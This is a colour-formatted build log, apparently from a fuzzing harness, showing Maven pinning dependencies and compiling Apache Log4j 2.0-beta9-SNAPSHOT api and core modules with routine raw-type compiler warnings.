[2;36m                    [0m         -[33mDexcludes[0m=[35mcom[0m.code-intelligence:jazzer -[33mDdepVersion[0m=[1;36m2[0m[1;36m.0[0m-beta9-SNAPSHOT              [2m               [0m
[2;36m                    [0m         -[33mDforceVersion[0m=[35mtrue[0m                                                                  [2m               [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m Scanning for projects[33m...[0m                                                      [2m               [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m                                                                               [2m               [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m ----------------------[1m<[0m[39m com.fuzzer:fuzz-targets >-----------------------[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Building fuzz [0m[1;36m0.0[0m[39m.[0m[1;36m1[0m[39m-SNAPSHOT[0m                                                  [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --------------------------------[0m[1;39m[[0m[39m jar [0m[1;39m][0m[39m---------------------------------[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- versions-maven-plugin:[0m[1;36m2.20[0m[39m.[0m[1;36m1[0m[39m:use-dep-version [0m[1;39m([0m[39mdefault-cli[0m[1;39m)[0m[39m @ fuzz-targets[0m [2m               [0m
[2;36m                    [0m         [39m---[0m                                                                                  [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Updated org.apache.logging.log4j:log4j-api:jar:[0m[1;36m2.0[0m[39m-beta9-SNAPSHOT to version [0m [2m               [0m
[2;36m                    [0m         [1;36m2.0[0m[39m-beta9-SNAPSHOT[0m                                                                   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Updated org.apache.logging.log4j:log4j-core:jar:[0m[1;36m2.0[0m[39m-beta9-SNAPSHOT to version[0m [2m               [0m
[2;36m                    [0m         [1;36m2.0[0m[39m-beta9-SNAPSHOT[0m                                                                   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m ------------------------------------------------------------------------[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m BUILD SUCCESS[0m                                                                 [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m ------------------------------------------------------------------------[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Total time:  [0m[1;36m0.781[0m[39m s[0m                                                          [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Finished at: [0m[1;36m2026[0m[39m-[0m[1;36m01[0m[39m-06T[0m[1;92m17:14:28[0m[39mZ[0m                                             [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m ------------------------------------------------------------------------[0m      [2m               [0m
[2;36m                    [0m         [39m+ rm -rf [0m[35m/out/[0m[95mm2[0m                                                                     [2m               [0m
[2;36m                    [0m         [39m+ cd [0m[35m/src/[0m[95mlogging-log4j2[0m                                                             [2m               [0m
[2;36m                    [0m         [39m+ [0m[35m/src/maven-3.6.3/apache-maven-3.6.3/bin/[0m[95mmvn[0m[39m clean install -DskipTests [0m             [2m               [0m
[2;36m                    [0m         [39m-Dspotless.skip -Drat.skip -Dspotbugs.skip -Dossindex.skip -am -pl [0m                  [2m               [0m
[2;36m                    [0m         [39m:log4j-api,:log4j-core -Dmaven.repo.[0m[33mlocal[0m[39m=[0m[35m/out/[0m[95mm2[0m                                    [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Scanning for projects[0m[33m...[0m                                                      [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m ------------------------------------------------------------------------[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Reactor Build Order:[0m                                                          [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Apache Log4j [0m[1;36m2[0m[39m                                                     [0m[1;39m[[0m[39mpom[0m[1;39m][0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Apache Log4j API                                                   [0m[1;39m[[0m[39mjar[0m[1;39m][0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Apache Log4j Core                                                  [0m[1;39m[[0m[39mjar[0m[1;39m][0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m -------------------< org.apache.logging.log4j:log4j >-------------------[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Building Apache Log4j [0m[1;36m2[0m[39m [0m[1;36m2.0[0m[39m-beta9-SNAPSHOT                         [0m[1;39m[[0m[1;36m1[0m[39m/[0m[1;36m3[0m[1;39m][0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --------------------------------[0m[1;39m[[0m[39m pom [0m[1;39m][0m[39m---------------------------------[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-clean-plugin:[0m[1;36m2.4[0m[39m.[0m[1;92m1:c[0m[39mlean [0m[1;39m([0m[39mdefault-clean[0m[1;39m)[0m[39m @ log4j ---[0m                [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-remote-resources-plugin:[0m[1;36m1.1[0m[39m:process [0m[1;39m([0m[39mdefault[0m[1;39m)[0m[39m @ log4j ---[0m           [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Setting property: classpath.resource.loader.class => [0m                         [2m               [0m
[2;36m                    [0m         [32m'org.codehaus.plexus.velocity.ContextClassLoaderResourceLoader'[0m[39m.[0m                     [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Setting property: velocimacro.messages.on => [0m[32m'false'[0m[39m.[0m                         [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Setting property: resource.loader => [0m[32m'classpath'[0m[39m.[0m                             [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Setting property: resource.manager.logwhenfound => [0m[32m'false'[0m[39m.[0m                   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-bundle-plugin:[0m[1;36m2.3[0m[39m.[0m[1;36m7[0m[39m:manifest [0m[1;39m([0m[39mbundle-manifest[0m[1;39m)[0m[39m @ log4j ---[0m          [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m Ignoring project type pom - supportedProjectTypes = [0m[1;39m[[0m[39mjar, bundle[0m[1;39m][0m          [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-install-plugin:[0m[1;36m2.3[0m[39m.[0m[1;36m1[0m[39m:install [0m[1;39m([0m[39mdefault-install[0m[1;39m)[0m[39m @ log4j ---[0m          [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Installing [0m[35m/src/logging-log4j2/[0m[95mpom.xml[0m[39m to [0m                                    [2m               [0m
[2;36m                    [0m         [35m/out/m2/org/apache/logging/log4j/log4j/2.0-beta9-SNAPSHOT/[0m[95mlog4j-2.0-beta9-SNAPSHOT.p[0m [2m               [0m
[2;36m                    [0m         [95mom[0m                                                                                   [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m -----------------< org.apache.logging.log4j:log4j-api >-----------------[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Building Apache Log4j API [0m[1;36m2.0[0m[39m-beta9-SNAPSHOT                       [0m[1;39m[[0m[1;36m2[0m[39m/[0m[1;36m3[0m[1;39m][0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --------------------------------[0m[1;39m[[0m[39m jar [0m[1;39m][0m[39m---------------------------------[0m      [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-clean-plugin:[0m[1;36m2.4[0m[39m.[0m[1;92m1:c[0m[39mlean [0m[1;39m([0m[39mdefault-clean[0m[1;39m)[0m[39m @ log4j-api ---[0m            [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-remote-resources-plugin:[0m[1;36m1.1[0m[39m:process [0m[1;39m([0m[39mdefault[0m[1;39m)[0m[39m @ log4j-api ---[0m       [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-resources-plugin:[0m[1;36m2.5[0m[39m:resources [0m[1;39m([0m[39mdefault-resources[0m[1;39m)[0m[39m @ log4j-api ---[0m  [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mdebug[0m[1;39m][0m[39m execute contextualize[0m                                                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Using [0m[32m'UTF-8'[0m[39m encoding to copy filtered resources.[0m                            [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m skip non existing resourceDirectory [0m                                          [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/api/src/main/[0m[95mresources[0m                                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Copying [0m[1;36m3[0m[39m resources[0m                                                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-compiler-plugin:[0m[1;36m3.1[0m[39m:compile [0m[1;39m([0m[39mdefault-compile[0m[1;39m)[0m[39m @ log4j-api ---[0m       [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Changes detected - recompiling the module![0m                                    [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Compiling [0m[1;36m59[0m[39m source files to [0m[35m/src/logging-log4j2/api/target/[0m[95mclasses[0m           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-bundle-plugin:[0m[1;36m2.3[0m[39m.[0m[1;36m7[0m[39m:manifest [0m[1;39m([0m[39mbundle-manifest[0m[1;39m)[0m[39m @ log4j-api ---[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-resources-plugin:[0m[1;36m2.5[0m[39m:testResources [0m[1;39m([0m[39mdefault-testResources[0m[1;39m)[0m[39m @ [0m       [2m               [0m
[2;36m                    [0m         [39mlog4j-api ---[0m                                                                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mdebug[0m[1;39m][0m[39m execute contextualize[0m                                                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Using [0m[32m'UTF-8'[0m[39m encoding to copy filtered resources.[0m                            [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Copying [0m[1;36m7[0m[39m resources[0m                                                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Copying [0m[1;36m3[0m[39m resources[0m                                                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-compiler-plugin:[0m[1;36m3.1[0m[39m:testCompile [0m[1;39m([0m[39mdefault-testCompile[0m[1;39m)[0m[39m @ log4j-api [0m  [2m               [0m
[2;36m                    [0m         [39m---[0m                                                                                  [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Changes detected - recompiling the module![0m                                    [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Compiling [0m[1;36m24[0m[39m source files to [0m[35m/src/logging-log4j2/api/target/[0m[95mtest-classes[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-surefire-plugin:[0m[1;36m2.14[0m[39m.[0m[1;36m1[0m[39m:test [0m[1;39m([0m[39mdefault-test[0m[1;39m)[0m[39m @ log4j-api ---[0m          [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Tests are skipped.[0m                                                            [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-jar-plugin:[0m[1;36m2.3[0m[39m.[0m[1;36m1[0m[39m:jar [0m[1;39m([0m[39mdefault-jar[0m[1;39m)[0m[39m @ log4j-api ---[0m                  [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Building jar: [0m[35m/src/logging-log4j2/api/target/[0m[95mlog4j-api-2.0-beta9-SNAPSHOT.jar[0m [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-install-plugin:[0m[1;36m2.3[0m[39m.[0m[1;36m1[0m[39m:install [0m[1;39m([0m[39mdefault-install[0m[1;39m)[0m[39m @ log4j-api ---[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Installing [0m[35m/src/logging-log4j2/api/target/[0m[95mlog4j-api-2.0-beta9-SNAPSHOT.jar[0m[39m to[0m [2m               [0m
[2;36m                    [0m         [35m/out/m2/org/apache/logging/log4j/log4j-api/2.0-beta9-SNAPSHOT/[0m[95mlog4j-api-2.0-beta9-SN[0m [2m               [0m
[2;36m                    [0m         [95mAPSHOT.jar[0m                                                                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Installing [0m[35m/src/logging-log4j2/api/[0m[95mpom.xml[0m[39m to [0m                                [2m               [0m
[2;36m                    [0m         [35m/out/m2/org/apache/logging/log4j/log4j-api/2.0-beta9-SNAPSHOT/[0m[95mlog4j-api-2.0-beta9-SN[0m [2m               [0m
[2;36m                    [0m         [95mAPSHOT.pom[0m                                                                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m ----------------< org.apache.logging.log4j:log4j-core >-----------------[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Building Apache Log4j Core [0m[1;36m2.0[0m[39m-beta9-SNAPSHOT                      [0m[1;39m[[0m[1;36m3[0m[39m/[0m[1;36m3[0m[1;39m][0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --------------------------------[0m[1;39m[[0m[39m jar [0m[1;39m][0m[39m---------------------------------[0m      [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-clean-plugin:[0m[1;36m2.4[0m[39m.[0m[1;92m1:c[0m[39mlean [0m[1;39m([0m[39mdefault-clean[0m[1;39m)[0m[39m @ log4j-core ---[0m           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-bundle-plugin:[0m[1;36m2.3[0m[39m.[0m[1;92m7:c[0m[39mleanVersions [0m[1;39m([0m[39mdefault[0m[1;39m)[0m[39m @ log4j-core ---[0m        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-remote-resources-plugin:[0m[1;36m1.1[0m[39m:process [0m[1;39m([0m[39mdefault[0m[1;39m)[0m[39m @ log4j-core ---[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-resources-plugin:[0m[1;36m2.5[0m[39m:resources [0m[1;39m([0m[39mdefault-resources[0m[1;39m)[0m[39m @ log4j-core ---[0m [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mdebug[0m[1;39m][0m[39m execute contextualize[0m                                                        [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Using [0m[32m'UTF-8'[0m[39m encoding to copy filtered resources.[0m                            [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Copying [0m[1;36m6[0m[39m resources[0m                                                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Copying [0m[1;36m3[0m[39m resources[0m                                                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m [0m                                                                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m --- maven-compiler-plugin:[0m[1;36m3.1[0m[39m:compile [0m[1;39m([0m[39mdefault-compile[0m[1;39m)[0m[39m @ log4j-core ---[0m      [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Changes detected - recompiling the module![0m                                    [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m Compiling [0m[1;36m307[0m[39m source files to [0m[35m/src/logging-log4j2/core/target/[0m[95mclasses[0m         [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m -------------------------------------------------------------[0m                 [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m COMPILATION WARNING : [0m                                                     [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mINFO[0m[1;39m][0m[39m -------------------------------------------------------------[0m                 [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m Signature attribute introduced in version [0m[1;36m49.0[0m[39m class files is ignored in [0m  [2m               [0m
[2;36m                    [0m         [39mversion [0m[1;36m48.0[0m[39m class files[0m                                                             [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m Signature attribute introduced in version [0m[1;36m49.0[0m[39m class files is ignored in [0m  [2m               [0m
[2;36m                    [0m         [39mversion [0m[1;36m48.0[0m[39m class files[0m                                                             [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mLoggerCo[0m [2m               [0m
[2;36m                    [0m         [95mnfig.java[0m[39m:[0m[1;39m[[0m[1;36m201[0m[39m,[0m[1;36m15[0m[1;39m][0m[39m found raw type: [0m                                                  [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl[0m                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl<T>[0m                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mLoggerCo[0m [2m               [0m
[2;36m                    [0m         [95mnfig.java[0m[39m:[0m[1;39m[[0m[1;36m236[0m[39m,[0m[1;36m38[0m[1;39m][0m[39m found raw type: [0m                                                  [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl[0m                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl<T>[0m                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mLoggerCo[0m [2m               [0m
[2;36m                    [0m         [95mnfig.java[0m[39m:[0m[1;39m[[0m[1;36m425[0m[39m,[0m[1;36m20[0m[1;39m][0m[39m found raw type: [0m                                                  [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl[0m                                 [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.AppenderControl<T>[0m                              [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mNode.jav[0m [2m               [0m
[2;36m                    [0m         [95ma[0m[39m:[0m[1;39m[[0m[1;36m34[0m[39m,[0m[1;36m19[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.config.plugins.PluginType[0m    [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mNode.jav[0m [2m               [0m
[2;36m                    [0m         [95ma[0m[39m:[0m[1;39m[[0m[1;36m48[0m[39m,[0m[1;36m61[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.config.plugins.PluginType[0m    [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mNode.jav[0m [2m               [0m
[2;36m                    [0m         [95ma[0m[39m:[0m[1;39m[[0m[1;36m112[0m[39m,[0m[1;36m12[0m[1;39m][0m[39m found raw type: org.apache.logging.log4j.core.config.plugins.PluginType[0m   [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mConfigur[0m [2m               [0m
[2;36m                    [0m         [95mationFactory.java[0m[39m:[0m[1;39m[[0m[1;36m110[0m[39m,[0m[1;36m39[0m[1;39m][0m[39m found raw type: [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/config/[0m[95mConfigur[0m [2m               [0m
[2;36m                    [0m         [95mationFactory.java[0m[39m:[0m[1;39m[[0m[1;36m112[0m[39m,[0m[1;36m32[0m[1;39m][0m[39m found raw type: [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/pattern/[0m[95mPattern[0m [2m               [0m
[2;36m                    [0m         [95mParser.java[0m[39m:[0m[1;39m[[0m[1;36m117[0m[39m,[0m[1;36m27[0m[1;39m][0m[39m found raw type: [0m                                                [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType[0m                              [2m               [0m
[2;36m                    [0m         [39m  missing type arguments for generic class [0m                                          [2m               [0m
[2;36m                    [0m         [39morg.apache.logging.log4j.core.config.plugins.PluginType<T>[0m                           [2m               [0m
[2;36m                    [0m         [1;39m[[0m[39mWARNING[0m[1;39m][0m[39m [0m                                                                           [2m               [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/pattern/[0m[95mPattern[0m [2m               [0m
